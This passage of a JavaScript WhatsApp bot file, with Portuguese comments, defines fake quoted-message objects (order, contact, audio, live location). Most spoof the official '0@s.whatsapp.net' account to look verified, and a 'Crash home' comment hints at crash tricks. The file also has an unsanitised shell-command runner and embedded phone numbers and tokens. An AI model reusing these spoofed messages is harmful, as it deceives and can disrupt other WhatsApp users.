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","itemCount":-9999,"status":"INQUIRY","surface":"CATALOG","message":"","orderTitle":"Scrr","sellerJid":"558398042937@s.whatsapp.net","token":"AR5NOhya+2v8n0fhYRJr/ensnmtWgeY0XQwCVX1Q4hx0NQ==","totalAmount1000":"1000","totalCurrencyCode":"BRL"}}} 
 //𝐏𝐑𝜭͢𝐗𝐢𝐌𝜭 𝐕𝚵𝐑𝐢𝐅𝐢𝐂͢𝚫𝐃𝜭 ⭐ ✦
const contatof = { 
        key : {
          "fromMe": false,
          "participant": "0@s.whatsapp.net",
          "mentions": true,
          "remoteJid": "556181496039-1625944593@g.us",
          participant : '0@s.whatsapp.net'
        },
        message: {"contactMessage":{"displayName":"𝗗𝗜𝗘 𝗠𝗢𝗗𝗦  ","vcard":"BEGIN:VCARD\nVERSION:3.0\nN:KALZIN;KALZIN;KALZIN;;\nFN:𝗗𝗜𝗘 𝗠𝗢𝗗𝗦  \nORG:\nTITLE:Nada Prequissoso\nitem1.TEL;waid=558398140301:+55 83 9814-0301\nitem1.X-ABLabel:Celular\nEND:VCARD"}}} 
 //𝐏𝐑𝜭͢𝐗𝐢𝐌𝜭 𝐕𝚵𝐑𝐢𝐅𝐢𝐂͢𝚫𝐃𝜭 ⭐ ✦



const audioquoted = { 
        key : {
          "fromMe": false,
          "participant": "0@s.whatsapp.net",
          "mentions": true,
          "remoteJid": "556181496039-1625944593@g.us",
          participant : '0@s.whatsapp.net'
        },
        message: {"audioMessage":{"url":"https://mmg.whatsapp.net/v/t62.7117-24/25352924_3536073899999571_8088095286439065133_n.enc?ccb=11-4&oh=01_AdQrKQZXW4TJYpj1K_yVl9h82ZiypVpMqNmi7b7ucksXjQ&oe=650791A6&mms3=true","mimetype":"audio/ogg; codecs=opus","fileSha256":"Y6GWSlIyob/sJR3lemznwMVdaBJqtz7gVi2t4L8+YyY=","fileLength":"36202","seconds":15,"ptt":false,"mediaKey":"p8ctSTcqF7m77ofsNZV1o1KsSCRvbH2M0OzYOBSE0Qg=","fileEncSha256":"Q++9WvVbKClr3sJHEekyD5UFvxNPnNVMx9oSJxkBmI0=","directPath":"/v/t62.7117-24/25352924_3536073899999571_8088095286439065133_n.enc?ccb=11-4&oh=01_AdQrKQZXW4TJYpj1K_yVl9h82ZiypVpMqNmi7b7ucksXjQ&oe=650791A6&_nc_hot=1692409138","mediaKeyTimestamp":"1692409075","contextInfo":{"forwardingScore":1,"isForwarded":true},"waveform":"GRgvMkk6NTEDMQYUAAAYGjYiIDxCIgAAS0clExJMPDlAEjgxADsCJAcvIAIARC4FBAAAAAAhNQctODwAPRs9AA=="}}} 
 //𝐏𝐑𝜭͢𝐗𝐢𝐌𝜭 𝐕𝚵𝐑𝐢𝐅𝐢𝐂͢𝚫𝐃𝜭 ⭐ ✦











//Crash home akakakkakakakaka fds
const thumb = fs.readFileSync('./lib/name.jpg')
const gifla = fs.readFileSync('./lib/gif.mp4')

//RUNCOMANDO
function runcomando(command, args) {
  return new Promise((resolve, reject) => {
    const child = spawn(command, args.split(" "), { shell: true, stdio: 'inherit' });

    child.on('error', (err) => {
      reject(err);
    });

    child.on('exit', (code) => {
      if (code === 0) {
        resolve();
      } else {
        reject(new Error(`O comando ${command} terminou com código ${code}`));
      }
    });
  });
}
// VERIFICADOS ⭐i hehea


const teste = {
      key: {
        "fromMe": false,
        "participant": "0@s.whatsapp.net",
        "mentions": true,
        "remoteJid": "556181496039-1625944593@g.us",
        participant: '0@s.whatsapp.net'
      },
      message: {"orderMessage":{"orderId":"131410286697652","thumbnail":"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","itemCount":-9999,"status":"INQUIRY","surface":"CATALOG","message":"","orderTitle":"Scrr","sellerJid":"558398042937@s.whatsapp.net","token":"AR5NOhya+2v8n0fhYRJr/ensnmtWgeY0XQwCVX1Q4hx0NQ==","totalAmount1000":"1000","totalCurrencyCode":"BRL"}}
    }
 //𝐏𝐑𝜭͢𝐗𝐢𝐌𝜭 𝐕𝚵𝐑𝐢𝐅𝐢𝐂͢𝚫𝐃𝜭 ⭐ ✦

const live = {key : {participant : '0@s.whatsapp.net'},message: {liveLocationMessage: { "fromMe": false,
"participant": "0@s.whatsapp.net",
"mentions": true,
remoteJid: "status@broadcast"}}} 
const imgm = {key : {participant : '0@s.whatsapp.net'},message: {imageMessage: {}}}
const vid = {key : {participant : '0@s.whatsapp.net'},message: {videoMessage: {}}}
const contato = {key : {participant : '0@s.whatsapp.net'},message: {contactMessage:{displayName: `${pushname}`}}}
const doc = {key : {participant : '0@s.whatsapp.net'},message: {documentMessage:{}}}

